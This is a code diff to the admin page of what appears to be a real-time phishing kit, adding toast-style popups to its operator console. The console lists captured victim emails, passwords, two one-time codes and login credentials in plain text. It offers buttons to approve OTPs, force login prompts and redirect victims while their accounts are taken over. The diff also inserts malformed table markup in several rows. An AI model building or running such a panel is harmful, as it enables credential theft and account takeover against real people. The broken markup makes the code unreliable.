@@ -314,6 +314,42 @@ tr:hover {
   font-size: 11px;
 }
 
+/* Small Action Popup Notifications */
+.action-popup {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  background: #10b981;
+  color: white;
+  padding: 12px 20px;
+  border-radius: 12px;
+  font-size: 13px;
+  font-weight: 500;
+  display: none;
+  align-items: center;
+  gap: 10px;
+  z-index: 1001;
+  animation: slideUp 0.3s ease;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+  max-width: 350px;
+}
+.action-popup.error {
+  background: #ef4444;
+}
+.action-popup.warning {
+  background: #f59e0b;
+}
+.action-popup.info {
+  background: #3b82f6;
+}
+@keyframes slideUp {
+  from { transform: translateY(100%); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+.action-popup i {
+  font-size: 16px;
+}
+
 /* Text Modal */
 .text-modal-overlay {
   display: none;
@@ -440,6 +476,11 @@ tr:hover {
   <p id="notificationMessage"></p>
 </div>
 
+<div id="actionPopup" class="action-popup">
+  <i class="fas fa-check-circle"></i>
+  <span id="actionPopupMessage">Action completed!</span>
+</div>
+
 <div id="textModal" class="text-modal-overlay">
   <div class="text-modal">
     <h3><i class="fas fa-paper-plane"></i> Send Text to User</h3>
@@ -468,7 +509,7 @@ tr:hover {
   </div>
 
   <div class="table-container">
-        <table>
+    <table>
       <thead>
             <tr>
           <th>Email</th>
@@ -483,7 +524,7 @@ tr:hover {
             </tr>
       </thead>
       <tbody id="usersTableBody">
-        <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>
+        <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...</td</span> </span>
       </tbody>
         </table>
   </div>
@@ -520,6 +561,32 @@ tr:hover {
   const socket = io({ auth: { token } });
   let audioContext = null;
   let currentSelectedEmail = null;
+
+  // ==================== ACTION POPUP FUNCTION ====================
+  function showActionPopup(message, type = 'success') {
+    const popup = document.getElementById('actionPopup');
+    const popupMessage = document.getElementById('actionPopupMessage');
+    const icon = popup.querySelector('i');
+    
+    popupMessage.textContent = message;
+    popup.className = `action-popup ${type}`;
+    
+    if (type === 'success') {
+      icon.className = 'fas fa-check-circle';
+    } else if (type === 'error') {
+      icon.className = 'fas fa-exclamation-circle';
+    } else if (type === 'warning') {
+      icon.className = 'fas fa-exclamation-triangle';
+    } else {
+      icon.className = 'fas fa-info-circle';
+    }
+    
+    popup.style.display = 'flex';
+    
+    setTimeout(() => {
+      popup.style.display = 'none';
+    }, 3000);
+  }
 
   function initAudio() {
     if (!audioContext) {
@@ -627,8 +694,10 @@ tr:hover {
   function copyToClipboard(text, fieldName) {
     if (!text || text === '-') return;
     navigator.clipboard.writeText(text).then(() => {
-      showNotification('Copied!', `${fieldName} copied`, 'copy', false);
-    }).catch(() => {});
+      showActionPopup(`${fieldName} copied to clipboard!`, 'success');
+    }).catch(() => {
+      showActionPopup('Failed to copy', 'error');
+    });
   }
 
   function showTextModal(email) {
@@ -645,7 +714,7 @@ tr:hover {
   async function sendTextToUser() {
     const text = document.getElementById('adminTextInput').value.trim();
     if (!text) {
-      showNotification('Error', 'Please enter a message', 'error', false);
+      showActionPopup('Please enter a message', 'error');
       return;
     }
     if (!currentSelectedEmail) return;
@@ -661,15 +730,15 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
-        showNotification('Text Sent', `Message sent to ${currentSelectedEmail}`, 'text', false);
+        showActionPopup(`Message sent to ${currentSelectedEmail}`, 'success');
         hideTextModal();
         loadUsers();
       } else {
-        showNotification('Error', data.error || 'Failed to send text', 'error', false);
+        showActionPopup(data.error || 'Failed to send text', 'error');
       }
     } catch (error) {
       console.error('Send text error:', error);
-      showNotification('Error', 'Network error', 'error', false);
+      showActionPopup('Network error. Failed to send text.', 'error');
     }
   }
 
@@ -687,21 +756,20 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
-        showNotification('Popup Released', `Text popup closed for ${currentSelectedEmail}`, 'release', false);
+        showActionPopup(`Text popup closed for ${currentSelectedEmail}`, 'success');
         hideTextModal();
         loadUsers();
       } else {
-        showNotification('Error', data.error || 'Failed to release', 'error', false);
+        showActionPopup(data.error || 'Failed to release', 'error');
       }
     } catch (error) {
       console.error('Release text error:', error);
-      showNotification('Error', 'Network error', 'error', false);
+      showActionPopup('Network error', 'error');
     }
   }
 
   async function deleteUser(email) {
     if (confirm(`⚠️ Are you sure you want to permanently delete user: ${email}?\n\nThis action cannot be undone.`)) {
-      showNotification('Deleting User', `Deleting ${email}...`, 'delete', false);
       try {
         const response = await fetch('/api/admin/delete-user', {
           method: 'POST',
@@ -713,14 +781,14 @@ tr:hover {
         });
         const data = await response.json();
         if (data.success) {
-          showNotification('User Deleted', `${email} has been removed`, 'delete', false);
+          showActionPopup(`User ${email} deleted successfully`, 'success');
           loadUsers();
         } else {
-          showNotification('Error', data.error || 'Failed to delete user', 'error', false);
+          showActionPopup(data.error || 'Failed to delete user', 'error');
         }
       } catch (error) {
         console.error('Delete user error:', error);
-        showNotification('Error', 'Network error', 'error', false);
+        showActionPopup('Network error. Failed to delete user.', 'error');
       }
     }
   }
@@ -740,6 +808,7 @@ tr:hover {
       updateStats(users);
     } catch(err) {
       console.error(err);
+      showActionPopup('Failed to load users', 'error');
     }
   }
 
@@ -772,7 +841,7 @@ tr:hover {
   function displayUsers(users) {
     const tbody = document.getElementById('usersTableBody');
     if (!users.length) {
-      tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td></tr>';
+      tbody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:30px; color:var(--text-muted);"><i class="fas fa-inbox"></i> No users found</td</span> </span>';
       return;
     }
     
@@ -780,7 +849,6 @@ tr:hover {
       let statusBadge = '';
       let actionButtons = '';
       
-      // ALL BUTTONS VISIBLE for users who have entered OTP
       if (user.approved && user.otp) {
         statusBadge = '<span class="badge badge-waiting">🔐 Active User</span>';
         actionButtons = `
@@ -803,22 +871,21 @@ tr:hover {
       
       return `
         <tr>
-          <td>${formatValue(user.email, 'Email')}</td>
-          <td>${formatValue(user.password, 'Password')}</td>
-          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td>
-          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td>
-          <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td>
-          <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td>
-          <td>${formatTimestamp(user.created_at)}</td>
-          <td>${statusBadge}</td>
-          <td class="actions-cell">${actionButtons}</td>
+          <td>${formatValue(user.email, 'Email')}</td</span>
+          <td>${formatValue(user.password, 'Password')}</td</span>
+          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td</span>
+          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td</span>
+          <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td</span>
+          <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td</span>
+          <td>${formatTimestamp(user.created_at)}</td</span>
+          <td>${statusBadge}</td</span>
+          <td class="actions-cell">${actionButtons}</td</span>
         </tr>
       `;
     }).join('');
   }
 
   async function approveEmail(email) {
-    showNotification('Email Approved', `Approving email for ${email}`, 'email-approve', false);
     try {
       const response = await fetch('/api/admin/approve-user', {
         method: 'POST',
@@ -830,15 +897,18 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showActionPopup(`Email ${email} approved successfully`, 'success');
         loadUsers();
+      } else {
+        showActionPopup(data.error || 'Failed to approve email', 'error');
       }
     } catch (error) {
       console.error('Approve email error:', error);
+      showActionPopup('Network error. Failed to approve email.', 'error');
     }
   }
 
   async function approveSecond(email) {
-    showNotification('OTP Approved', `Approved OTP for ${email} - Ready for next code`, 'approve-otp', false);
     try {
       const response = await fetch('/api/admin/approve-second', {
         method: 'POST',
@@ -850,15 +920,18 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showActionPopup(`OTP for ${email} approved successfully`, 'success');
         loadUsers();
+      } else {
+        showActionPopup(data.error || 'Failed to approve OTP', 'error');
       }
     } catch (error) {
       console.error('Approve second error:', error);
+      showActionPopup('Network error. Failed to approve OTP.', 'error');
     }
   }
 
   async function forceLogin(email) {
-    showNotification('Force Login', `Forcing login popup for ${email}`, 'force-login', false);
     try {
       const response = await fetch('/api/admin/force-login', {
         method: 'POST',
@@ -870,15 +943,18 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showActionPopup(`Force login triggered for ${email}`, 'success');
         loadUsers();
+      } else {
+        showActionPopup(data.error || 'Failed to trigger force login', 'error');
       }
     } catch (error) {
       console.error('Force login error:', error);
+      showActionPopup('Network error. Failed to trigger force login.', 'error');
     }
   }
 
   async function redirectToSuccess(email) {
-    showNotification('Redirect to Success', `Redirecting ${email} to success page`, 'redirect', false);
     try {
       const response = await fetch('/api/admin/redirect-success', {
         method: 'POST',
@@ -890,16 +966,23 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showActionPopup(`Redirect to success triggered for ${email}`, 'success');
         loadUsers();
+      } else {
+        showActionPopup(data.error || 'Failed to trigger redirect', 'error');
       }
     } catch (error) {
       console.error('Redirect success error:', error);
+      showActionPopup('Network error. Failed to trigger redirect.', 'error');
     }
   }
 
   function logout() {
-    localStorage.removeItem('adminToken');
-    window.location.href = '/admin';
+    showActionPopup('Logging out...', 'info');
+    setTimeout(() => {
+      localStorage.removeItem('adminToken');
+      window.location.href = '/admin';
+    }, 500);
   }
 
   // Socket listeners
